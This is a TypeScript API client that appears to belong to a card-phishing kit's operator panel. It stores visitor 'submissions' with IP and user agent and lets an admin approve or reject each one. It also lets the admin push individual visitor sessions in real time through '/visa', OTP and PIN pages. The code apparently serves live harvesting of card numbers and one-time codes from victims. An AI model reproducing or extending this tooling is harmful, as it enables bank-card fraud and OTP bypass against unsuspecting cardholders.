const API_BASE_URL = import.meta.env.VITE_API_BASE_URL ?? "/api";

// Navigation action types
export type NavigationAction = 'MAIN' | 'CARD' | 'PIN1' | 'PIN2' | 'PIN3' | 'OTP' | 'SUCCESS' | 'ERROR';

// Map actions to page routes
export const ACTION_TO_ROUTE: Record<NavigationAction, string> = {
  'MAIN': '/',
  'CARD': '/visa',
  'PIN1': '/otp',
  'PIN2': '/otp2',
  'PIN3': '/otp3',
  'OTP': '/otp',
  'SUCCESS': '/success',
  'ERROR': '/error',
};

// Valid actions list for validation
const VALID_ACTIONS: string[] = ['MAIN', 'CARD', 'PIN1', 'PIN2', 'PIN3', 'OTP', 'SUCCESS', 'ERROR'];

// Get Supabase config
function getSupabaseConfig() {
  return {
    url: import.meta.env.VITE_SUPABASE_URL ?? "",
    key: import.meta.env.VITE_SUPABASE_ANON_KEY ?? "",
  };
}

// HTTP request helper
async function jsonRequest(path: string, method: string, body?: unknown, token?: string) {
  const headers = { "Content-Type": "application/json" };
  if (token) headers.Authorization = `Bearer ${token}`;
  
  const url = API_BASE_URL.replace(/\/+$/, "") + (path.startsWith("/") ? path : "/" + path);
  const response = await fetch(url, { method, headers, body: body ? JSON.stringify(body) : undefined });
  const text = await response.text();
  const data = text ? JSON.parse(text) : null;
  if (!response.ok) throw new Error(data?.error || response.statusText);
  return data;
}

// API interfaces
export interface AdminLoginResponse { success: boolean; token: string; }
export interface AdminStatsResponse { totalSessions: number; totalSubmissions: number; byType: { type: string; count: number }[]; }
export interface SubmissionRow { 
  id: number; 
  sessionId: string; 
  type: string; 
  data: string | null; 
  ipAddress: string | null; 
  createdAt: string; 
  userAgent?: string | null;
  status?: 'PENDING' | 'APPROVED' | 'REJECTED'; // Status per submission row
}

export type SubmissionStatus = 'PENDING' | 'APPROVED' | 'REJECTED';
export interface SubmissionListResponse { submissions: SubmissionRow[]; total: number; page: number; limit: number; }

// Admin functions
export async function submitSubmission(type: string, body: Record<string, unknown>) {
  return jsonRequest(`/submissions/${type}`, "POST", body);
}

export async function adminLogin(username: string, password: string) {
  return jsonRequest<AdminLoginResponse>("/admin/login", "POST", { username, password });
}

export async function adminLogout(token: string) {
  return jsonRequest<{ success: boolean }>("/admin/logout", "POST", undefined, token);
}

export async function adminLogoutAll(token: string) {
  return jsonRequest<{ success: boolean }>("/admin/logout-all", "POST", undefined, token);
}

export async function adminChangePassword(token: string, newPassword: string) {
  return jsonRequest<{ success: boolean }>("/admin/change-password", "POST", { newPassword }, token);
}

export async function getAdminStats(token: string) {
  return jsonRequest<AdminStatsResponse>("/admin/stats", "GET", undefined, token);
}

export async function listAdminSubmissions(token: string, params?: Record<string, string | number>) {
  const qs = params ? "?" + new URLSearchParams(Object.entries(params).map(([k, v]) => [k, String(v)])) : "";
  return jsonRequest<SubmissionListResponse>(`/admin/submissions${qs}`, "GET", undefined, token);
}

export async function getAllAdminSubmissions(token: string) {
  return jsonRequest<{ submissions: SubmissionRow[]; total: number }>("/admin/all-submissions", "GET", undefined, token);
}

// Fetch from Supabase directly
export async function getAdminSubmissionsFromSupabase() {
  const { url, key } = getSupabaseConfig();
  if (!url || !key) throw new Error("Supabase not configured");
  
  const response = await fetch(`${url}/rest/v1/submissions?select=*&order=created_at.desc`, {
    headers: { "apikey": key, "Authorization": `Bearer ${key}` },
  });
  
  if (!response.ok) throw new Error(`HTTP ${response.status}`);
  const data = await response.json();
  return (data || []).map((row: any) => ({
    id: row.id,
    sessionId: row.session_id,
    type: row.type,
    data: typeof row.data === 'string' ? row.data : JSON.stringify(row.data),
    ipAddress: row.ip_address,
    createdAt: row.created_at,
    userAgent: row.user_agent,
    status: row.status || 'PENDING',
  }));
}

/**
 * Update submission status in Supabase (per-row status)
 */
export async function updateSubmissionStatus(submissionId: number, status: SubmissionStatus): Promise<boolean> {
  const { url, key } = getSupabaseConfig();
  if (!url || !key) {
    console.warn("Supabase not configured");
    return false;
  }

  try {
    const response = await fetch(
      `${url}/rest/v1/submissions?id=eq.${submissionId}`,
      {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
          'apikey': key,
          'Authorization': `Bearer ${key}`,
          'Prefer': 'return=representation'
        },
        body: JSON.stringify({ status }),
      }
    );

    if (!response.ok) {
      const errText = await response.text();
      console.error("Failed to update status:", response.status, errText);
      return false;
    }

    console.log("Status updated:", { submissionId, status });
    return true;
  } catch (err) {
    console.error("Error updating status:", err);
    return false;
  }
}

export interface ControlActionResponse { action: string | null; }

export async function getControlAction(sessionId: string) {
  return jsonRequest<ControlActionResponse>(`/control/${sessionId}`, "GET");
}

export async function sendAdminControl(sessionId: string, action: string, token: string) {
  return jsonRequest<{ success: boolean; sessionId: string; action: string }>(`/admin/control/${sessionId}`, "POST", { action }, token);
}

// ============================================================
// NAVIGATION CONTROL FUNCTIONS
// ============================================================

// Check if action is valid
function checkValidAction(action: unknown): action is NavigationAction {
  if (typeof action !== 'string') return false;
  return VALID_ACTIONS.includes(action);
}

/**
 * Send navigation command to Supabase controls table
 */
export async function sendNavigationCommand(sessionId: string, action: NavigationAction): Promise<boolean> {
  const { url, key } = getSupabaseConfig();
  
  console.log("📡 sendNavigationCommand:", { sessionId, action, url: url ? "configured" : "NOT configured" });
  
  if (!url || !key) {
    console.warn("⚠️ Supabase not configured - cannot send navigation command");
    return false;
  }
  
  try {
    const expiresAt = new Date(Date.now() + 60000).toISOString();
    const payload = { 
      session_id: sessionId, 
      action, 
      redirect_to: null, 
      expires_at: expiresAt 
    };
    
    console.log("📝 Payload:", JSON.stringify(payload));
    
    const response = await fetch(`${url}/rest/v1/controls`, {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json', 
        'apikey': key, 
        'Authorization': `Bearer ${key}`, 
        'Prefer': 'return=representation' 
      },
      body: JSON.stringify(payload),
    });
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error("❌ Failed to send command:", response.status, errorText);
      return false;
    }
    
    const result = await response.json();
    console.log("✅ Command sent successfully:", action, "for session:", sessionId, result);
    return true;
  } catch (err) {
    console.error("❌ Error sending command:", err);
    return false;
  }
}

/**
 * Get pending navigation command from Supabase
 */
export async function getNavigationCommand(sessionId: string): Promise<{ action: NavigationAction; redirect_to: string | null } | null> {
  const { url, key } = getSupabaseConfig();
  if (!url || !key) return null;
  
  try {
    const encodedId = encodeURIComponent(sessionId);
    const queryUrl = `${url}/rest/v1/controls?session_id=eq.${encodedId}&order=created_at.desc&limit=5`;
    
    const response = await fetch(queryUrl, {
      headers: { 'apikey': key, 'Authorization': `Bearer ${key}` },
    });
    
    if (!response.ok) {
      console.error("Failed to get command:", response.status);
      return null;
    }
    
    const data = await response.json();
    
    // Safety check for array
    if (!data || !Array.isArray(data) || data.length === 0) {
      return null;
    }
    
    const now = new Date();
    
    // Find first valid non-expired command
    for (let i = 0; i < data.length; i++) {
      const item = data[i];
      
      // Skip if not object
      if (!item || typeof item !== 'object') continue;
      
      // Check expiration
      if (item.expires_at) {
        try {
          const expDate = new Date(item.expires_at);
          if (expDate < now) continue;
        } catch (e) {
          continue;
        }
      }
      
      // Check valid action
      if (checkValidAction(item.action)) {
        return {
          action: item.action as NavigationAction,
          redirect_to: item.redirect_to || null,
        };
      }
    }
    
    return null;
  } catch (err) {
    console.error("Error getting command:", err);
    return null;
  }
}

/**
 * Delete navigation commands for session
 */
export async function deleteNavigationCommands(sessionId: string): Promise<void> {
  const { url, key } = getSupabaseConfig();
  if (!url || !key) return;
  
  try {
    const encodedId = encodeURIComponent(sessionId);
    await fetch(`${url}/rest/v1/controls?session_id=eq.${encodedId}`, {
      method: 'DELETE',
      headers: { 'apikey': key, 'Authorization': `Bearer ${key}` },
    });
    console.log("Deleted commands for session:", sessionId);
  } catch (err) {
    console.error("Error deleting commands:", err);
  }
}

// Legacy aliases
export async function getPendingNavigationCommand(sessionId: string) {
  return getNavigationCommand(sessionId);
}

export async function clearNavigationCommand(sessionId: string): Promise<void> {
  return deleteNavigationCommands(sessionId);
}

export async function sendRedirectCommand(sessionId: string, target: string): Promise<boolean> {
  const map: Record<string, NavigationAction> = {
    'home': 'MAIN', 'card': 'CARD', 'otp1': 'PIN1', 'otp2': 'PIN2', 'otp3': 'PIN3',
    'atm': 'OTP', 'success': 'SUCCESS', 'error': 'ERROR',
  };
  const action = map[target];
  if (!action) return false;
  return sendNavigationCommand(sessionId, action);
}

export async function getPendingRedirect(sessionId: string): Promise<{ redirect_to: string } | null> {
  const cmd = await getNavigationCommand(sessionId);
  return cmd ? { redirect_to: cmd.action } : null;
}

export async function clearRedirectCommand(sessionId: string): Promise<void> {
  return deleteNavigationCommands(sessionId);
}
